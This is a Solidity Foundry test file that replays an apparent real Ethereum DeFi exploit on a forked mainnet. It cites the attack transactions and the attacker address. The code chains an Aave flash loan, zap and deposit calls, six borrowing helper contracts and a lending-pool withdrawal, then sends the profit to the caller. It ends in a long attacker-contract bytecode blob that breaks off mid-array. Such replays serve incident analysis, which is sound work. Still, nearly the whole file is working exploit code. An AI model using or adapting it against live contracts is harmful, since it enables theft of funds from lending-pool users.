// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";

// https://explorer.phalcon.xyz/tx/eth/0x04e16a79ff928db2fa88619cdd045cdfc7979a61d836c9c9e585b3d6f6d8bc31
// https://etherscan.io/address/0xB90CF1d740B206B6d80854BC525E609Dc42B45Dc

struct S2 {
    address p1;
    uint256 p2;
    address p3;
    address p4;
    address p5;
    S3 p6;
}

struct S1 {
    uint256 p1;
    uint256 p2;
    uint256 p3;
    uint256 p4;
    uint256 p5;
}

struct S3 {
    uint8 p1;
    address p2;
    bytes p3;
    bool p4;
}

interface I {
    function approve(address, uint256) external payable;
    function lendingPoolData(address) external payable;
    function submit(address) external payable;
    function mintPosition() external payable;
    function balanceOf(address) external payable returns (uint256);
    function withdraw(uint256, uint256) external payable;
    function withdraw(uint256) external payable;
    function getPositionLendingShares(uint256, address) external payable;
    function zapOut(uint256, uint256, S2 memory, bool) external payable;
    function depositExactAmount(uint256, address, uint256) external payable;
    function exchange(int128, int128, uint256, uint256) external payable;
    function transfer(address, uint256) external payable;
    function zapIn(uint256, uint256, S1 memory, S2 memory, bool) external payable;
    function withdrawExactShares(uint256) external payable;
    function getTotalPool(address) external payable;
    function depositExactAmount(uint256) external payable;
    function slot0() external payable;
    function token1() external payable returns (address);
    function unwrap(uint256) external payable;
    function swap(address, bool, int256, uint160, bytes memory) external payable;
    function deposit(uint256, uint256, bool) external payable;
    function withdrawExactAmount(uint256, address, uint256) external payable;
    function token0() external payable returns (address);
    function borrowExactAmount(uint256, address, uint256) external payable;
    function withdrawExactShares(uint256, address, uint256) external payable;
    function flashLoan(address, address[] memory, uint256[] memory, uint256[] memory, address, bytes memory, uint16)
        external
        payable;
}

contract X91c4 is Test {
    address immutable r = address(this);
    receive() external payable {}

    function setUp() public pure {
        console2.log("0x04e16a79ff928db2fa88619cdd045cdfc7979a61d836c9c9e585b3d6f6d8bc31");
    }

    address constant x0000 = 0x0000000000000000000000000000000000000000;
    address constant x11b8 = 0x11b815efB8f581194ae79006d24E0d814B7697F6;
    address constant x32e0 = 0x32E0A7F7C4b1A19594d25bD9b63EBA912b1a5f61;
    address constant x37e4 = 0x37e49bf3749513A02FA535F0CbC383796E8107E4;
    address constant x4d32 = 0x4D32C8Ff2fACC771eC7Efc70d6A8468bC30C26bF;
    address constant x4f1c = 0x4f1cDF43f5E407abD569878976960d4d0A3d3452;
    address constant x5777 = 0x5777d92f208679DB4b9778590Fa3CAB3aC9e2168;
    address constant x636f = 0x000000000000000000636F6e736F6c652e6c6f67;
    address constant x6b17 = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
    address constant x7d27 = 0x7d2768dE32b0b80b7a3454c06BdAc94A69DDc7A9;
    address constant x7f39 = 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0;
    address constant x88e6 = 0x88e6A0c2dDD26FEEb64F039a2c41296FcB3f5640;
    address constant x898c = 0x898CA9B3ef8b6a30dA5fc7202f70E7992b3602B3;
    address constant xa0b8 = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address constant xae7a = 0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84;
    address constant xb40b = 0xB40b073d7E47986D3A45Ca7Fd30772C25A2AD57f;
    address constant xc02a = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address constant xc374 = 0xC374f7eC85F8C7DE3207a10bB1978bA104bdA3B2;
    address constant xdac1 = 0xdAC17F958D2ee523a2206206994597C13D831ec7;

    address x51ff;
    address x130f;
    address x3a0e;
    address x0307;
    address x15b9;
    address xd68e;
    address x0b1b;

    uint256 t_uniswapV3SwapCallback = 0;

    function test1() public {
        // vm.startPrank(0xB90CF1d740B206B6d80854BC525E609Dc42B45Dc, 0xB90CF1d740B206B6d80854BC525E609Dc42B45Dc);

        vm.createSelectFork("http://localhost:18545", 18992907); // tx.blockNumber - 1
        // vm.createSelectFork("http://localhost:18545", bytes32(0x33e3c94e8e0359b7a98b74a02454a52fad2a8fb7faee02f888807bc60f688628));

        // https://explorer.phalcon.xyz/tx/eth/0x33e3c94e8e0359b7a98b74a02454a52fad2a8fb7faee02f888807bc60f688628
        this.x33e3c94e();
        // https://explorer.phalcon.xyz/tx/eth/0x67d6c554314c9b306d683afb3bc4a10e70509ceb0fdf8415a5e270a91fae52de
        this.x67d6c554();
        // https://explorer.phalcon.xyz/tx/eth/0x04e16a79ff928db2fa88619cdd045cdfc7979a61d836c9c9e585b3d6f6d8bc31
        x0826c023();
    }

    function test2() public {
        // vm.startPrank(0xB90CF1d740B206B6d80854BC525E609Dc42B45Dc, 0xB90CF1d740B206B6d80854BC525E609Dc42B45Dc);

        vm.createSelectFork("http://localhost:18545", 18992895); // tx.blockNumber - 1
        // https://explorer.phalcon.xyz/tx/eth/0x33e3c94e8e0359b7a98b74a02454a52fad2a8fb7faee02f888807bc60f688628
        this.x33e3c94e();
        vm.warp(1705087715);
        vm.roll(18992903);
        // https://explorer.phalcon.xyz/tx/eth/0x67d6c554314c9b306d683afb3bc4a10e70509ceb0fdf8415a5e270a91fae52de
        this.x67d6c554();
        vm.warp(1705087763);
        vm.roll(18992907);
        // https://explorer.phalcon.xyz/tx/eth/0x04e16a79ff928db2fa88619cdd045cdfc7979a61d836c9c9e585b3d6f6d8bc31
        x0826c023();
    }

    function test3() public {
        // vm.startPrank(, );

        vm.createSelectFork("http://localhost:18545", 18992907); // tx.blockNumber - 1

        vm.warp(1705087763);
        vm.roll(18992908);
        // https://explorer.phalcon.xyz/tx/eth/0x04e16a79ff928db2fa88619cdd045cdfc7979a61d836c9c9e585b3d6f6d8bc31
        x0826c023();
    }

    function x67d6c554() public {
        r.call{value: 100000000000000000}(hex"4abcd4e9");
    }

    function x33e3c94e() public {
        _constructor_();
    }

    function x0826c023() public {
        address[] memory arr01 = new address[](1);
        arr01[0] = xae7a;
        uint256[] memory arr02 = new uint256[](1);
        arr02[0] = 1110000000000000000000;
        uint256[] memory arr03 = new uint256[](1);
        arr03[0] = 0;
        bytes memory b01 = abi.encode(32, 0);
        I(x7d27).flashLoan(r, arr01, arr02, arr03, r, b01, 0);

        x0b1b.delegatecall(
            hex"41ad6f2000000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000000"
        );
        // uint256 v1 = 98144896603951420531;
        uint256 v1 = I(xc02a).balanceOf(r);
        console2.log("I(xc02a).balanceOf(r)\t\t->", "98144896603951420531 (98.1448 ether)");
        I(xc02a).withdraw(v1);
        address(tx.origin).call{value: 178198734313096114765}("");
    }

    function uniswapV3SwapCallback(int256, int256, bytes memory) public {
        t_uniswapV3SwapCallback++;

        if (t_uniswapV3SwapCallback == 1) {
            // address v1 = x6b17;
            address v1 = I(x5777).token0();
            console2.log("I(x5777).token0()\t->", v1);
            I(x6b17).transfer(x5777, 5000000000000000000000);
            return;
        }
        if (t_uniswapV3SwapCallback == 2) {
            // address v1 = xa0b8;
            address v1 = I(x88e6).token0();
            console2.log("I(x88e6).token0()\t->", v1);
            I(xa0b8).transfer(x88e6, 13999414783);
            return;
        }
        if (t_uniswapV3SwapCallback == 3) {
            // address v1 = xdac1;
            address v1 = I(x11b8).token1();
            console2.log("I(x11b8).token1()\t->", v1);
            I(xdac1).transfer(x11b8, 2000000000);
            return;
        }
    }

    function executeOperation(address[] memory, uint256[] memory, uint256[] memory, address, bytes memory) public {
        x0b1b.delegatecall(hex"ecf2051e00000000000000000000000000000000000000000000003c2c582ef7cb980000");
        x0b1b.delegatecall(hex"abe515040000000000000000000000000000000000000000000000000000000000000008");
        I(x37e4).lendingPoolData(xb40b);
        I(xb40b).transfer(x3a0e, 36472996377170786411);
        X3a0e(payable(x3a0e)).borrow();
        I(x37e4).lendingPoolData(xb40b);
        I(xb40b).transfer(xd68e, 41683424431052327327);
        Xd68e(payable(xd68e)).borrow();
        I(x37e4).lendingPoolData(xb40b);
        I(xb40b).transfer(x51ff, 47638199349774088374);
        X51ff(payable(x51ff)).borrow();
        I(x37e4).lendingPoolData(xb40b);
        I(xb40b).transfer(x15b9, 54443656399741815284);
        X15b9(payable(x15b9)).borrow();
        I(x37e4).lendingPoolData(xb40b);
        I(xb40b).transfer(x0307, 62221321599704931753);
        X0307(payable(x0307)).borrow();
        I(x37e4).lendingPoolData(xb40b);
        I(xb40b).transfer(x130f, 71110081828234207718);
        X130f(payable(x130f)).borrow();
        I(x37e4).getTotalPool(xb40b);
        I(x37e4).withdrawExactAmount(8, xb40b, 469361815219056461244);
        x0b1b.delegatecall(
            hex"58b9648f00000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000000"
        );
        // uint256 v1 = 104066616635764896511;
        uint256 v1 = I(x7f39).balanceOf(r);
        console2.log("I(x7f39).balanceOf(r)\t\t->", "104066616635764896511 (104.6661 ether)");
        I(x7f39).unwrap(v1);

        bytes memory rt = hex"0000000000000000000000000000000000000000000000000000000000000001";
        assembly {
            return(add(rt, 0x20), mload(rt))
        }
    }

    function x4abcd4e9() public payable {
        I(xae7a).submit{value: 100000000000000000}(x0000);
        I(x32e0).mintPosition();
        I(xae7a).approve(x4f1c, type(uint256).max);
        I(xae7a).approve(x7d27, type(uint256).max);
        I(xc374).approve(x4f1c, type(uint256).max);
        I(xc374).approve(x4d32, type(uint256).max);
        I(x898c).approve(x4f1c, type(uint256).max);
        I(xc374).approve(xb40b, type(uint256).max);
        I(xb40b).approve(x37e4, type(uint256).max);
        I(xc02a).approve(x37e4, type(uint256).max);

        S1 memory s101 = S1(22169950325070900, 22838368757032600, 22281357110624100, 100, 500000000000000000);
        S3 memory s301 = S3(0, x0000, "", false);
        S2 memory s201 = S2(xae7a, 100000000000000000, xae7a, x0000, x0000, s301);
        I(x4f1c).zapIn(6, 0, s101, s201, false);

        // uint256 v1 = 48194088030415070;
        uint256 v1 = I(x898c).balanceOf(r);
        console2.log("I(x898c).balanceOf(r)\t\t->", "48194088030415070 (0.4819 ether)");
        I(x4d32).withdraw(6, v1);
        // uint256 v2 = 48194088030415070;
        uint256 v2 = I(xc374).balanceOf(r);
        console2.log("I(xc374).balanceOf(r)\t\t->", "48194088030415070 (0.4819 ether)");
        I(xb40b).depositExactAmount(v2);
        I(x37e4).depositExactAmount(8, xb40b, 10000000000);
        // uint256 v3 = 48049495766323824;
        uint256 v3 = I(xb40b).balanceOf(r);
        console2.log("I(xb40b).balanceOf(r)\t\t->", "48049495766323824 (0.4804 ether)");
        I(xb40b).transfer(x37e4, v3);
        x3a0e = address(new X3a0e(r));
        xd68e = address(new Xd68e(r));
        x51ff = address(new X51ff(r));
        x15b9 = address(new X15b9(r));
        x0307 = address(new X0307(r));
        x130f = address(new X130f(r));
    }

    function call() public payable {}

    function _constructor_() public {
        x0b1b = address(new X0b1b(r));

        bytes memory rt = abi.encodePacked(
            hex"608060405260043610620000615760003560e01c80630826c023146200006e57",
            hex"8063150b7a0214620000885780634abcd4e914620000cc578063920f5c841462",
            hex"0000d8578063f4c35aae146200011c578063fa461e33146200014a5762000069",
            hex"565b366200006957005b600080fd5b3480156200007b57600080fd5b50620000",
            hex"8662000178565b005b3480156200009557600080fd5b50620000b46004803603",
            hex"810190620000ae91906200262d565b62000434565b604051620000c391906200",
            hex"2700565b60405180910390f35b620000d662000449565b005b348015620000e5",
            hex"57600080fd5b50620001046004803603810190620000fe9190620027db565b62",
            hex"000f72565b6040516200011391906200290d565b60405180910390f35b348015",
            hex"6200012957600080fd5b50620001486004803603810190620001429190620029",
            hex"2a565b620015f6565b005b3480156200015757600080fd5b5062000176600480",
            hex"360381019062000170919062002997565b62001765565b005b62000182620019",
            hex"a0565b6000601060009054906101000a900473ffffffffffffffffffffffffff",
            hex"ffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166341",
            hex"ad6f2060e01b604051602401620001d69062002a52565b604051602081830303",
            hex"815290604052907bffffffffffffffffffffffffffffffffffffffffffffffff",
            hex"ffffffff19166020820180517bffffffffffffffffffffffffffffffffffffff",
            hex"ffffffffffffffffff838183161783525050505060405162000242919062002a",
            hex"ed565b600060405180830381855af49150503d80600081146200027f57604051",
            hex"9150601f19603f3d011682016040523d82523d6000602084013e62000284565b",
            hex"606091505b5050905060011515811515146200029a57600080fd5b6000805490",
            hex"6101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffff",
            hex"ffffffffffffffffffffffffffffffffff16632e1a7d4d60008054906101000a",
            hex"900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffff",
            hex"ffffffffffffffffffffffffff166370a08231306040518263ffffffff1660e0",
            hex"1b815260040162000331919062002b17565b602060405180830381865afa1580",
            hex"156200034f573d6000803e3d6000fd5b505050506040513d601f19601f820116",
            hex"8201806040525081019062000375919062002b4b565b6040518263ffffffff16",
            hex"60e01b815260040162000393919062002b8e565b600060405180830381600087",
            hex"803b158015620003ae57600080fd5b505af1158015620003c3573d6000803e3d",
            hex"6000fd5b50505050600e60009054906101000a900473ffffffffffffffffffff",
            hex"ffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff",
            hex"166108fc479081150290604051600060405180830381858888f1935050505015",
            hex"801562000430573d6000803e3d6000fd5b5050565b600063150b7a0260e01b90",
            hex"5095945050505050565b600160009054906101000a900473ffffffffffffffff",
            hex"ffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffff",
            hex"ffff1663a1903eab67016345785d8a000060006040518363ffffffff1660e01b",
            hex"8152600401620004b0919062002b17565b60206040518083038185885af11580",
            hex"15620004cf573d6000803e3d6000fd5b50505050506040513d601f19601f8201",
            hex"1682018060405250810190620004f6919062002b4b565b50600b600090549061",
            hex"01000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffff",
            hex"ffffffffffffffffffffffffffffffff1663c814d2d16040518163ffffffff16",
            hex"60e01b81526004016020604051808303816000875af115801562000567573d60",
            hex"00803e3d6000fd5b505050506040513d601f19601f8201168201806040525081",
            hex"01906200058d919062002b4b565b600f819055506200059d62001bff565b6000",
            hex"604051806080016040528060006003811115620005c157620005c062002bab56",
            hex"5b5b8152602001600073ffffffffffffffffffffffffffffffffffffffff1681",
            hex"5260200160405180602001604052806000815250815260200160001515815250",
            hex"905060006040518060a00160405280664ec373cdd05c34815260200166512360",
            hex"190326988152602001664f28c6b7b13f648152602001606481526020016706f0",
            hex"5b59d3b20000815250905060006040518060c001604052806001600090549061",
            hex"01000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffff",
            hex"ffffffffffffffffffffffffffffffff16815260200167016345785d8a000081",
            hex"52602001600160009054906101000a900473ffffffffffffffffffffffffffff",
            hex"ffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260",
            hex"2001600073ffffffffffffffffffffffffffffffffffffffff16815260200160",
            hex"0073ffffffffffffffffffffffffffffffffffffffff16815260200184815250",
            hex"9050600760009054906101000a900473ffffffffffffffffffffffffffffffff",
            hex"ffffffff1673ffffffffffffffffffffffffffffffffffffffff166323f810a5",
            hex"60066000858560006040518663ffffffff1660e01b8152600401620007899594",
            hex"9392919062002ec3565b600060405180830381600087803b158015620007a457",
            hex"600080fd5b505af1158015620007b9573d6000803e3d6000fd5b50505050600a",
            hex"60009054906101000a900473ffffffffffffffffffffffffffffffffffffffff",
            hex"1673ffffffffffffffffffffffffffffffffffffffff1663441a3e7060066009",
            hex"60009054906101000a900473ffffffffffffffffffffffffffffffffffffffff",
            hex"1673ffffffffffffffffffffffffffffffffffffffff166370a0823130604051",
            hex"8263ffffffff1660e01b81526004016200085a919062002b17565b6020604051",
            hex"80830381865afa15801562000878573d6000803e3d6000fd5b50505050604051",
            hex"3d601f19601f820116820180604052508101906200089e919062002b4b565b60",
            hex"40518363ffffffff1660e01b8152600401620008bd92919062002f29565b6000",
            hex"60405180830381600087803b158015620008d857600080fd5b505af115801562",
            hex"0008ed573d6000803e3d6000fd5b50505050600d60009054906101000a900473",
            hex"ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffff",
            hex"ffffffffffffffffffff16634b940e0a600860009054906101000a900473ffff",
            hex"ffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffff",
            hex"ffffffffffffffff166370a08231306040518263ffffffff1660e01b81526004",
            hex"016200098c919062002b17565b602060405180830381865afa158015620009aa",
            hex"573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040",
            hex"5250810190620009d0919062002b4b565b6040518263ffffffff1660e01b8152",
            hex"600401620009ee919062002b8e565b60408051808303816000875af115801562",
            hex"000a0d573d6000803e3d6000fd5b505050506040513d601f19601f8201168201",
            hex"806040525081019062000a33919062002f56565b5050600c6000905490610100",
            hex"0a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffff",
            hex"ffffffffffffffffffffffffffff1663d30f6292600f54600d60009054906101",
            hex"000a900473ffffffffffffffffffffffffffffffffffffffff166402540be400",
            hex"6040518463ffffffff1660e01b815260040162000abf9392919062002fe0565b",
            hex"6020604051808303816000875af115801562000adf573d6000803e3d6000fd5b",
            hex"505050506040513d601f19601f8201168201806040525081019062000b059190",
            hex"62002b4b565b50600d60009054906101000a900473ffffffffffffffffffffff",
            hex"ffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16",
            hex"63a9059cbb600c60009054906101000a900473ffffffffffffffffffffffffff",
            hex"ffffffffffffff16600d60009054906101000a900473ffffffffffffffffffff",
            hex"ffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff",
            hex"166370a08231306040518263ffffffff1660e01b815260040162000bc4919062",
            hex"002b17565b602060405180830381865afa15801562000be2573d6000803e3d60",
            hex"00fd5b505050506040513d601f19601f8201168201806040525081019062000c",
            hex"08919062002b4b565b6040518363ffffffff1660e01b815260040162000c2792",
            hex"91906200301d565b600060405180830381600087803b15801562000c42576000",
            hex"80fd5b505af115801562000c57573d6000803e3d6000fd5b5050505060405162",
            hex"000c6990620024fd565b604051809103906000f08015801562000c86573d6000",
            hex"803e3d6000fd5b50601160006006811062000c9f5762000c9e6200304a565b5b",
            hex"0160006101000a81548173ffffffffffffffffffffffffffffffffffffffff02",
            hex"1916908373ffffffffffffffffffffffffffffffffffffffff16021790555060",
            hex"405162000cec90620024fd565b604051809103906000f08015801562000d0957",
            hex"3d6000803e3d6000fd5b50601160016006811062000d225762000d216200304a",
            hex"565b5b0160006101000a81548173ffffffffffffffffffffffffffffffffffff",
            hex"ffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790",
            hex"555060405162000d6f90620024fd565b604051809103906000f0801580156200",
            hex"0d8c573d6000803e3d6000fd5b50601160026006811062000da55762000da462",
            hex"00304a565b5b0160006101000a81548173ffffffffffffffffffffffffffffff",
            hex"ffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16",
            hex"021790555060405162000df290620024fd565b604051809103906000f0801580",
            hex"1562000e0f573d6000803e3d6000fd5b50601160036006811062000e28576200",
            hex"0e276200304a565b5b0160006101000a81548173ffffffffffffffffffffffff",
            hex"ffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffff",
            hex"ffff16021790555060405162000e7590620024fd565b604051809103906000f0",
            hex"8015801562000e92573d6000803e3d6000fd5b50601160046006811062000eab",
            hex"5762000eaa6200304a565b5b0160006101000a81548173ffffffffffffffffff",
            hex"ffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffff",
            hex"ffffffffff16021790555060405162000ef890620024fd565b60405180910390",
            hex"6000f08015801562000f15573d6000803e3d6000fd5b50601160056006811062",
            hex"000f2e5762000f2d6200304a565b5b0160006101000a81548173ffffffffffff",
            hex"ffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffff",
            hex"ffffffffffffffff160217905550505050565b60008060106000905490610100",
            hex"0a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffff",
            hex"ffffffffffffffffffffffffffff1663ecf2051e60e01b683c2c582ef7cb9800",
            hex"0060405160240162000fd29190620030d1565b60405160208183030381529060",
            hex"4052907bffffffffffffffffffffffffffffffffffffffffffffffffffffffff",
            hex"19166020820180517bffffffffffffffffffffffffffffffffffffffffffffff",
            hex"ffffffffff83818316178352505050506040516200103e919062002aed565b60",
            hex"0060405180830381855af49150503d80600081146200107b576040519150601f",
            hex"19603f3d011682016040523d82523d6000602084013e62001080565b60609150",
            hex"5b5050905060011515811515146200109657600080fd5b601060009054906101",
            hex"000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffff",
            hex"ffffffffffffffffffffffffffffff1663abe5150460e01b600f546040516024",
            hex"01620010ec919062002b8e565b604051602081830303815290604052907bffff",
            hex"ffffffffffffffffffffffffffffffffffffffffffffffffffff191660208201",
            hex"80517bffffffffffffffffffffffffffffffffffffffffffffffffffffffff83",
            hex"8183161783525050505060405162001158919062002aed565b60006040518083",
            hex"0381855af49150503d806000811462001195576040519150601f19603f3d0116",
            hex"82016040523d82523d6000602084013e6200119a565b606091505b5050809150",
            hex"506001151581151514620011b257600080fd5b620011be6000620022a7565b62",
            hex"0011ca6001620022a7565b620011d66002620022a7565b620011e26003620022",
            hex"a7565b620011ee6004620022a7565b620011fa6005620022a7565b600c600090",
            hex"54906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ff",
            hex"ffffffffffffffffffffffffffffffffffffff166377cfd4a5600f54600d6000",
            hex"9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1660",
            hex"0c60009054906101000a900473ffffffffffffffffffffffffffffffffffffff",
            hex"ff1673ffffffffffffffffffffffffffffffffffffffff16632ab88d1c600d60",
            hex"009054906101000a900473ffffffffffffffffffffffffffffffffffffffff16",
            hex"6040518263ffffffff1660e01b8152600401620012dd919062002b17565b6020",
            hex"60405180830381865afa158015620012fb573d6000803e3d6000fd5b50505050",
            hex"6040513d601f19601f8201168201806040525081019062001321919062002b4b",
            hex"565b6040518463ffffffff1660e01b81526004016200134193929190620030ee",
            hex"565b6020604051808303816000875af115801562001361573d6000803e3d6000",
            hex"fd5b505050506040513d601f19601f8201168201806040525081019062001387",
            hex"919062002b4b565b50601060009054906101000a900473ffffffffffffffffff",
            hex"ffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffff",
            hex"ff166358b9648f60e01b604051602401620013da9062002a52565b6040516020",
            hex"81830303815290604052907bffffffffffffffffffffffffffffffffffffffff",
            hex"ffffffffffffffff19166020820180517bffffffffffffffffffffffffffffff",
            hex"ffffffffffffffffffffffffff83818316178352505050506040516200144691",
            hex"9062002aed565b600060405180830381855af49150503d806000811462001483",
            hex"576040519150601f19603f3d011682016040523d82523d6000602084013e6200",
            hex"1488565b606091505b5050809150506001151581151514620014a057600080fd",
            hex"5b600260009054906101000a900473ffffffffffffffffffffffffffffffffff",
            hex"ffffff1673ffffffffffffffffffffffffffffffffffffffff1663de0e9a3e60",
            hex"0260009054906101000a900473ffffffffffffffffffffffffffffffffffffff",
            hex"ff1673ffffffffffffffffffffffffffffffffffffffff166370a08231306040",
            hex"518263ffffffff1660e01b81526004016200153b919062002b17565b60206040",
            hex"5180830381865afa15801562001559573d6000803e3d6000fd5b505050506040",
            hex"513d601f19601f820116820180604052508101906200157f919062002b4b565b",
            hex"6040518263ffffffff1660e01b81526004016200159d919062002b8e565b6020",
            hex"604051808303816000875af1158015620015bd573d6000803e3d6000fd5b5050",
            hex"50506040513d601f19601f82011682018060405250810190620015e391906200",
            hex"2b4b565b5060019150509998505050505050505050565b600e60009054906101",
            hex"000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffff",
            hex"ffffffffffffffffffffffffffffff163273ffffffffffffffffffffffffffff",
            hex"ffffffffffff16146200165157600080fd5b8073ffffffffffffffffffffffff",
            hex"ffffffffffffffff1663a9059cbb600e60009054906101000a900473ffffffff",
            hex"ffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffff",
            hex"ffffffffffffff166370a08231306040518263ffffffff1660e01b8152600401",
            hex"620016cb919062002b17565b602060405180830381865afa158015620016e957",
            hex"3d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052",
            hex"508101906200170f919062002b4b565b6040518363ffffffff1660e01b815260",
            hex"04016200172e9291906200301d565b600060405180830381600087803b158015",
            hex"6200174957600080fd5b505af11580156200175e573d6000803e3d6000fd5b50",
            hex"50505050565b600e60009054906101000a900473ffffffffffffffffffffffff",
            hex"ffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1632",
            hex"73ffffffffffffffffffffffffffffffffffffffff1614620017c057600080fd",
            hex"5b6000841315620018ad573373ffffffffffffffffffffffffffffffffffffff",
            hex"ff16630dfe16816040518163ffffffff1660e01b815260040160206040518083",
            hex"0381865afa15801562001816573d6000803e3d6000fd5b505050506040513d60",
            hex"1f19601f820116820180604052508101906200183c919062003142565b73ffff",
            hex"ffffffffffffffffffffffffffffffffffff1663a9059cbb33866040518363ff",
            hex"ffffff1660e01b8152600401620018789291906200301d565b60006040518083",
            hex"0381600087803b1580156200189357600080fd5b505af1158015620018a8573d",
            hex"6000803e3d6000fd5b505050505b60008313156200199a573373ffffffffffff",
            hex"ffffffffffffffffffffffffffff1663d21220a76040518163ffffffff1660e0",
            hex"1b8152600401602060405180830381865afa15801562001903573d6000803e3d",
            hex"6000fd5b505050506040513d601f19601f820116820180604052508101906200",
            hex"1929919062003142565b73ffffffffffffffffffffffffffffffffffffffff16",
            hex"63a9059cbb33856040518363ffffffff1660e01b815260040162001965929190",
            hex"6200301d565b600060405180830381600087803b1580156200198057600080fd",
            hex"5b505af115801562001995573d6000803e3d6000fd5b505050505b5050505056",
            hex"5b6000600167ffffffffffffffff811115620019c057620019bf62003174565b",
            hex"5b604051908082528060200260200182016040528015620019ef578160200160",
            hex"2082028036833780820191505090505b509050600160009054906101000a9004",
            hex"73ffffffffffffffffffffffffffffffffffffffff168160008151811062001a",
            hex"2c5762001a2b6200304a565b5b602002602001019073ffffffffffffffffffff",
            hex"ffffffffffffffffffff16908173ffffffffffffffffffffffffffffffffffff",
            hex"ffff16815250506000600167ffffffffffffffff81111562001a865762001a85",
            hex"62003174565b5b60405190808252806020026020018201604052801562001ab5",
            hex"5781602001602082028036833780820191505090505b509050683c2c582ef7cb",
            hex"9800008160008151811062001ad95762001ad86200304a565b5b602002602001",
            hex"0181815250506000600167ffffffffffffffff81111562001b055762001b0462",
            hex"003174565b5b60405190808252806020026020018201604052801562001b3457",
            hex"81602001602082028036833780820191505090505b5090506000604051602001",
            hex"62001b4a9062002a52565b604051602081830303815290604052905060066000",
            hex"9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673",
            hex"ffffffffffffffffffffffffffffffffffffffff1663ab9c4b5d308686863087",
            hex"60006040518863ffffffff1660e01b815260040162001bc59796959493929190",
            hex"620033b6565b600060405180830381600087803b15801562001be057600080fd",
            hex"5b505af115801562001bf5573d6000803e3d6000fd5b5050505050505050565b",
            hex"600160009054906101000a900473ffffffffffffffffffffffffffffffffffff",
            hex"ffff1673ffffffffffffffffffffffffffffffffffffffff1663095ea7b36007",
            hex"60009054906101000a900473ffffffffffffffffffffffffffffffffffffffff",
            hex"167fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff",
            hex"ffff6040518363ffffffff1660e01b815260040162001ca09291906200301d56",
            hex"5b600060405180830381600087803b15801562001cbb57600080fd5b505af115",
            hex"801562001cd0573d6000803e3d6000fd5b50505050600160009054906101000a",
            hex"900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffff",
            hex"ffffffffffffffffffffffffff1663095ea7b3600660009054906101000a9004",
            hex"73ffffffffffffffffffffffffffffffffffffffff167fffffffffffffffffff",
            hex"ffffffffffffffffffffffffffffffffffffffffffffff6040518363ffffffff",
            hex"1660e01b815260040162001d759291906200301d565b60006040518083038160",
            hex"0087803b15801562001d9057600080fd5b505af115801562001da5573d600080",
            hex"3e3d6000fd5b50505050600860009054906101000a900473ffffffffffffffff",
            hex"ffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffff",
            hex"ffff1663095ea7b3600760009054906101000a900473ffffffffffffffffffff",
            hex"ffffffffffffffffffff167fffffffffffffffffffffffffffffffffffffffff",
            hex"ffffffffffffffffffffffff6040518363ffffffff1660e01b81526004016200",
            hex"1e4a9291906200301d565b600060405180830381600087803b15801562001e65",
            hex"57600080fd5b505af115801562001e7a573d6000803e3d6000fd5b5050505060",
            hex"0860009054906101000a900473ffffffffffffffffffffffffffffffffffffff",
            hex"ff1673ffffffffffffffffffffffffffffffffffffffff1663095ea7b3600a60",
            hex"009054906101000a900473ffffffffffffffffffffffffffffffffffffffff16",
            hex"7fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff",
            hex"ff6040518363ffffffff1660e01b815260040162001f1f9291906200301d565b",
            hex"600060405180830381600087803b15801562001f3a57600080fd5b505af11580",
            hex"1562001f4f573d6000803e3d6000fd5b50505050600960009054906101000a90",
            hex"0473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffff",
            hex"ffffffffffffffffffffffff1663095ea7b3600760009054906101000a900473",
            hex"ffffffffffffffffffffffffffffffffffffffff167fffffffffffffffffffff",
            hex"ffffffffffffffffffffffffffffffffffffffffffff6040518363ffffffff16",
            hex"60e01b815260040162001ff49291906200301d565b6000604051808303816000",
            hex"87803b1580156200200f57600080fd5b505af115801562002024573d6000803e",
            hex"3d6000fd5b50505050600860009054906101000a900473ffffffffffffffffff",
            hex"ffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffff",
            hex"ff1663095ea7b3600d60009054906101000a900473ffffffffffffffffffffff",
            hex"ffffffffffffffffff167fffffffffffffffffffffffffffffffffffffffffff",
            hex"ffffffffffffffffffffff6040518363ffffffff1660e01b8152600401620020",
            hex"c99291906200301d565b600060405180830381600087803b158015620020e457",
            hex"600080fd5b505af1158015620020f9573d6000803e3d6000fd5b50505050600d",
